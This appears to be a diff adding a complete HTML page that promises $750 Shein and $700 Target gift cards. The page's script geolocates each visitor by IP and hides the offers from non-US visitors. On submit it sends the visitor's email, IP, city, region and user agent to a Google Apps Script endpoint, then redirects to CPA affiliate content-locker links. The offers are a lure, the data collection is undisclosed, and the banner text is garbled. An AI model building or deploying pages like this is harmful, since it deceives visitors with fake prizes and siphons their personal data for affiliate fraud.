@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gift Card Rewards</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f8f8;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .highlight-bar {
+      background-color: #ffcc00;
+      color: #000;
+      font-weight: bold;
+      padding: 10px;
+      font-size: 18px;
+    }
+    .offer-section {
+      background: #fff;
+      margin: 20px auto;
+      max-width: 600px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 20px;
+    }
+    .offer-title {
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+    .offer-desc {
+      margin: 10px 0;
+      color: #555;
+    }
+    .offer-img {
+      max-width: 100%;
+      border-radius: 8px;
+    }
+    .email-form {
+      margin-top: 15px;
+    }
+    input[type="email"] {
+      padding: 10px;
+      width: 80%;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    .submit-btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      cursor: pointer;
+    }
+    .shein-btn { background-color: #f5ba00; }
+    .target-btn { background-color: #cc0000; }
+    .hidden { display: none; }
+    .separator {
+      border-top: 2px dashed #ccc;
+      margin: 40px auto;
+      width: 80%;
+    }
+    .error-message {
+      color: red;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="highlight-bar">
+    Guys do it potentially so you can get rid from cyber james eventually
+  </div>
+
+  <!-- Non-US Message -->
+  <div id="geoMessage" class="error-message hidden">
+    Your IP Location is not according to Offer Requirements.
+  </div>
+
+  <!-- Shein Offer -->
+  <div class="offer-section" id="sheinOffer">
+    <div class="offer-title">Shein Gift Card $750</div>
+    <img class="offer-img" src="https://i.imgur.com/yMgf0wr.jpg" alt="Shein Gift Card">
+    <div class="offer-desc">CPA GRIP Email and Zip submit</div>
+    <form class="email-form" onsubmit="submitForm(event, 'https://singingfiles.com/show.php?l=0&u=2425645&id=68776')">
+      <input type="email" name="email" placeholder="Enter your valid email" required><br>
+      <button type="submit" class="submit-btn shein-btn">Claim Now</button>
+    </form>
+  </div>
+
+  <div class="separator"></div>
+
+  <!-- Target Offer -->
+  <div class="offer-section" id="targetOffer">
+    <div class="offer-title">Target Gift Card $700</div>
+    <img class="offer-img" src="https://i.imgur.com/X2yqtBS.png" alt="Target Gift Card">
+    <div class="offer-desc">CPA LEAD Complete Level 1</div>
+    <form class="email-form" onsubmit="submitForm(event, 'https://lnksforyou.com/view.php?id=5541382&pub=3284681')">
+      <input type="email" name="email" placeholder="Enter your valid email" required><br>
+      <button type="submit" class="submit-btn target-btn">Claim Now</button>
+    </form>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzp-tqrhJk07gJyV4YP-ulhfLVF1_QOKM7ePOYIlL6T81dsFyYc2p0CWyStb8XULe0X7w/exec"; 
+    const allowedCountry = "US";
+    const minTime = 10; // Minimum 10 seconds before valid submit
+    const startTime = Date.now();
+
+    // Check location
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        if (data.country !== allowedCountry) {
+          document.getElementById("geoMessage").classList.remove("hidden");
+          document.getElementById("sheinOffer").classList.add("hidden");
+          document.getElementById("targetOffer").classList.add("hidden");
+        }
+        window.visitorInfo = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country
+        };
+      });
+
+    // Submit form
+    function submitForm(e, redirectURL) {
+      e.preventDefault();
+
+      const email = e.target.email.value;
+      if (!email.includes("@")) return alert("Enter valid email.");
+
+      const elapsed = (Date.now() - startTime) / 1000;
+      if (elapsed < minTime) return alert("Please stay at least 10 seconds before submitting.");
+
+      const ua = navigator.userAgent;
+      const { ip, city, region } = window.visitorInfo || {};
+
+      fetch(scriptURL + 
+        `?email=${encodeURIComponent(email)}&ip=${ip}&city=${city}&region=${region}&ua=${ua}`, 
+        { method: "GET" }
+      )
+      .then(() => {
+        window.location.href = redirectURL;
+      })
+      .catch(() => {
+        alert("Submission failed. Try again.");
+      });
+    }
+  </script>
+</body>
+</html>
